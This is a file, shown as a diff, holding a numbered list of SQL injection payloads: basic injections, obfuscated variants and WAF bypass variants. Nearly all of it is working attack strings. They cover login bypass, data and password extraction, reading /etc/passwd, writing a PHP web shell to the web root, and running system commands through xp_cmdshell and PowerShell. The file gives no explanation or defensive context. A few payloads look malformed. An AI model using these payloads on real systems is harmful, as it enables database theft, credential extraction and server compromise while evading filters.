@@ -1,0 +1,78 @@
+SQL Injection Payloads
+
+1. `' OR 1=1--+`
+2. `' UNION SELECT NULL,@@version,NULL#`
+3. `' AND 1=CONVERT(int,(SELECT top 1 table_name FROM information_schema.tables))`
+4. `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)`
+5. `' AND EXTRACTVALUE(1,CONCAT(0x5c,USER()))`
+6. `' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')`
+7. `' UNION SELECT NULL,NULL,NULL FROM users WHERE username='admin'`
+8. `' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL#`
+9. `'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'#`
+10. `'; EXEC master..xp_cmdshell 'whoami'`
+11. `'; pg_sleep(5);--`
+12. `') ORDER BY 1--`
+13. `') ORDER BY 9999--`
+14. `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)`
+15. `') OR 1=1 AND '1'='1`
+16. `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1--`
+17. `' AND (SELECT COUNT(*) FROM users) > 0`
+18. `'; DECLARE @cmd varchar(max); SET @cmd='powershell ipconfig'; EXEC(@cmd);--`
+19. `' UNION SELECT NULL, GROUP_CONCAT(schema_name), NULL FROM information_schema.schemata--`
+20. `' AND (SELECT 1 FROM RDB$DATABASE WHERE 1=0 UNION ALL SELECT 1 FROM RDB$DATABASE)`
+21. `' UNION SELECT NULL, NULL, NULL /*!50000FROM*/ users --`
+22. `' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))=97--`
+
+---
+
+2. Obfuscated Payloads:
+
+1. `%27%20OR%201%3D1%2D%2D%2B` (URL Encoding)
+2. `' /*!50000UNION*/ /*!50000SELECT*/ NULL,@@version,NULL#` (Inline Comments)
+3. `' AnD 1=CoNvErT(iNt,(SeLeCt ToP 1 table_name FrOm information_schema.tables))` (Case Manipulation)
+4. `' || (SELECT * FROM (SELECT(SLEEP(5)))a)--` (Alternative Keyword `||`)
+5. `' AND EXTRACTVALUE(1,CONCAT(0x5c,CHAR(85)+CHAR(83)+CHAR(69)+CHAR(82)+CHAR(40)+CHAR(41)))` (CHAR() Function)
+6. `' AND EXIST%s(SEL%ECT 1 FROM users WHERE username=%27admin%27 AND password LIKE %27a%25%27)` (Mixed Encoding and Whitespace)
+7. `0x2720554e494f4e2053454c454354204e554c4c2c4e554c4c2c4e554c4c2046524f4d20757365727320574845524520757365726e616d653d2761646d696e27` (Hex Encoding)
+8. `' UNI' + 'ON SELECT NULL,LOAD_FILE('/etc/passwd'),NULL#` (String Concatenation)
+9. `'; SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE '/var/www/html/backdoor.php'#` (Hex Encoding of PHP String)
+10. `'; EXEC master..xp_cmdshell 'wh'+'oa'+'mi'` (String Concatenation)
+11. `'; /*!pg_sleep*/(5);--` (Inline Comment)
+12. `') OR%0ADER%09BY 1--` (Newline and Tab Injection)
+13. `') ORDE' + 'R BY 9999--` (String Concatenation)
+14. `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(0x61,5)` (Hex Encoding of String Literal)
+15. `') %6f%72 1%3d1 %61%6e%64 %271%27%3d%271` (Mixed URL/Hex Encoding of Keywords)
+16. `' UNI%0aON SEL%0DECT NULL,table_name,NULL FRO%0DM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1--` (Multiple Whitespace Injection)
+17. `' AND (SELECT COUNT(*) FROM `users`) > 0` (Backticks for Table Name)
+18. `'; DECLARE @cmd varchar(max); SET @cmd=CHAR(112)+CHAR(111)+CHAR(119)+CHAR(101)+CHAR(114)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(105)+CHAR(112)+CHAR(99)+CHAR(111)+CHAR(110)+CHAR(102)+CHAR(105)+CHAR(103); EXEC(@cmd);--` (CHAR() Encoding of Command String)
+19. `' UNION SELECT NULL, /*!00000GROUP_CONCAT*/(schema_name), NULL FROM information_schema.schemata--` (Inline Comment for Function)
+20. `' AND (SELECT 1 FROM RDB$DATABASE WHERE 1=0 UNI%0aON ALL SELECT 1 FROM RDB$DATABASE)` (Newline in UNION Keyword)
+21. `' U%0aNION SELECT NULL, NULL, NULL FROM users --` (Newline in UNION Keyword Itself)
+22. `' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),/*!1*/1,/*!1*/1))=97--` (Inline Comments Inside Arguments)
+
+---
+
+3. WAF Bypass Payloads:
+
+1. `id=1&id=%27%20OR%201%3D1%2D%2D%2B` (HTTP Parameter Pollution)
+2. `'UNI%0aON%0dSELECT NULL,@@version,NULL%23` (Newline/Whitespace Insertion)
+3. `' AND 1=CONVERT(int,(SELECT /*!00000top*/ 1 table_name FROM /*!00000information_schema*/.tables))` (Inline Comment with Version)
+4. `' AND (SELECT * FROM (SELECT(SLEEP(5)))%23%0a%23a)` (Garbage Comments and Newline)
+5. `' AND EXTRACTVALUE(1,CONCAT(0x5c,USER/**/()))` (Comment in Function Call)
+6. `' AND EXISTS(SELECT /**/1 FROM users /**/WHERE username=%27admin%27 AND password LIKE %27a%25%27)` (Multi-part Comment Obfuscation)
+7. `' UNION SELECT%00NULL,NULL,NULL FROM users WHERE username='admin'` (Null Byte Injection)
+8. `' UNION SELECT NULL,LPAD('a',1,'a') || LOAD_FILE('/etc/passwd'),NULL#` (SQL Function Wrapping and Concatenation)
+9. `'; SELECT CONCAT(CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(115),CHAR(121),CHAR(115),CHAR(116),CHAR(101),CHAR(109),CHAR(40),CHAR(36),CHAR(95),CHAR(71),CHAR(69),CHAR(84),CHAR(91),CHAR(34),CHAR(99),CHAR(109),CHAR(100),CHAR(34),CHAR(93),CHAR(41),CHAR(59),CHAR(32),CHAR(63),CHAR(62)) INTO OUTFILE '/var/www/html/backdoor.php'#` (Full CHAR() Encoding of PHP String)
+10. `'; EXEC master..xp_cmdshell N'wh%6fuami'` (Unicode Encoding)
+11. `'; pg_sleep(5)%252d%252d` (Double URL Encoding)
+12. `') ORDER /**/BY 1--` (Whitespace and Comment Injection)
+13. `') ORDER BY /*!000009999*/--` (Inline Comment with Version)
+14. `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),5)` (CHR() Function for String Literal)
+15. `') OR%0b1=1%0aAND%0c'1'='1` (Form Feed, Newline, Vertical Tab Injection)
+16. `' UNION SELECT NULL,table_name,NULL FROM /**/information_schema/**/.tables WHERE table_schema=DATABASE() LIMIT 0,1--` (Split Keyword with Comments)
+17. `' AND (SELECT COUNT(*) FROM `users`/* comment */) > 0` (Backticks and Comment)
+18. `'; DECLARE @cmd varchar(max); SET @cmd='powershell ipconfig'; EXEC(/*bypass*/@cmd);--` (Comment in EXEC Argument)
+19. `' UNION SELECT NULL, CONCAT_WS(CHAR(32), schema_name), NULL FROM information_schema.schemata--` (Alternative Function CONCAT_WS and CHAR() for delimiter)
+20. `' AND (SELECT 1 FROM RDB$DATABASE WHERE 1=0 /*!UN*/ION ALL SELECT 1 FROM RDB$DATABASE)` (Inline Comment in UNION Keyword)
+21. `' UNION SELECT NULL, NULL, NULL %2F%2A%2150000FROM%2A%2F users --` (Double URL Encoding of Inline Comment)
+22. `' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1)/**/,1,1))=97--` (Extra Comments in Function Arguments)
